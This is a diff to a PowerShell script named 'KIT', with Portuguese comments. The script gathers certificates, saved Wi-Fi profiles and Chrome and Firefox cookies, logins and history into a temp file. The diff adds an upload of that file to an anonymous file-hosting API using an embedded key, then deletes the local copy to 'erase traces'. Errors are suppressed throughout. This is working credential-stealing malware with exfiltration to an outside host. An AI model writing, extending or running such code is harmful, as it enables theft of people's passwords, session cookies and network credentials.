@@ -1,4 +1,4 @@
-# KIT v7.4  –  TXT 100% legível, sem erros de path
+# KIT v7.5  –  TXT legível + upload AnonFiles
 $ErrorActionPreference = 'SilentlyContinue'
 $out = "$env:TEMP\kit_$(Get-Random).txt"
 '' | Set-Content $out -Encoding UTF8
@@ -35,7 +35,7 @@ OutKit "`n=== Certs ==="
 Get-ChildItem Cert:\CurrentUser\My |
     Select Subject,Thumbprint,NotAfter | ConvertTo-Json -Compress | %{ OutKit $_ }
 
-# ---------- 4) Wi-Fi – XML em folder próprio ----------
+# ---------- 4) Wi-Fi ----------
 $wifiDir = "$env:TEMP\wifi_$(Get-Random)"
 New-Item $wifiDir -ItemType Directory -Force | Out-Null
 Push-Location $wifiDir
@@ -47,7 +47,7 @@ Get-ChildItem $wifiDir -Filter *.xml | %{
 Pop-Location
 Remove-Item $wifiDir -Recurse -Force
 
-# ---------- 5) Navegadores – só texto/base64 ----------
+# ---------- 5) Browsers ----------
 @(
     @{P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";F=@('Cookies','Login Data','History')},
     @{P="$env:APPDATA\Mozilla\Firefox\Profiles";F=@('cookies.sqlite','logins.json','places.sqlite')},
@@ -62,7 +62,7 @@ Remove-Item $wifiDir -Recurse -Force
             try{
                 if($full -match '\.(sqlite|db)$'){
                     Add-Type -Path "$env:PROGRAMFILES\System.Data.SQLite\System.Data.SQLite.dll" -EA Stop
-                    $cnn = New-Object Data.SQLite.SQLiteConnection "Data Source=$full;Read Only=True;Mode=ReadOnly"
+                    $cnn = New-Object Data.SQLite.SQLiteConnection "Data Source=$full;Read Only=True"
                     $cnn.Open()
                     $da = New-Object Data.SQLite.SQLiteDataAdapter "SELECT host,name,value FROM cookies LIMIT 50",$cnn
                     $tbl = New-Object System.Data.DataTable;  [void]$da.Fill($tbl)
@@ -79,6 +79,30 @@ Remove-Item $wifiDir -Recurse -Force
     }
 }
 
-# ---------- 6) Fim ----------
-Write-Host "`nKit salvo em:  $out" -Fore Green
-Invoke-Item $out
+# ---------- 6) Upload AnonFiles ----------
+$url  = 'https://api.anonfilesnew.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d&pretty=true'
+try{
+    $fileBin = [IO.File]::ReadAllBytes($out)
+    $enc     = [System.Text.Encoding]::GetEncoding('ISO-8859-1')
+    $body    = $enc.GetString($fileBin)
+    $boundary= [Guid]::NewGuid().ToString()
+    $LF      = "`r`n"
+    $head    = "--$boundary$LFContent-Disposition: form-data; name=`"file`"; filename=`"kit.txt`"$LFContent-Type: text/plain$LF$LF"
+    $foot    = "$LF--$boundary--$LF"
+    $req     = [System.Net.WebRequest]::Create($url)
+    $req.Method='POST'
+    $req.ContentType="multipart/form-data; boundary=$boundary"
+    $bytes   = [System.Text.Encoding]::UTF8.GetBytes($head+$body+$foot)
+    $req.ContentLength=$bytes.Length
+    $s=$req.GetRequestStream();$s.Write($bytes,0,$bytes.Length);$s.Close()
+    $resp=$req.GetResponse()
+    $sr=New-Object IO.StreamReader($resp.GetResponseStream())
+    $result=$sr.ReadToEnd();$sr.Close();$resp.Close()
+    Write-Host "`nUpload OK – link:" -Fore Green
+    ($result|ConvertFrom-Json).data.file.url.full
+}catch{
+    Write-Host "`nUpload falhou: $($_.Exception.Message)" -Fore Red
+}
+
+# ---------- 7) Apagar rastro ----------
+Remove-Item $out -Force
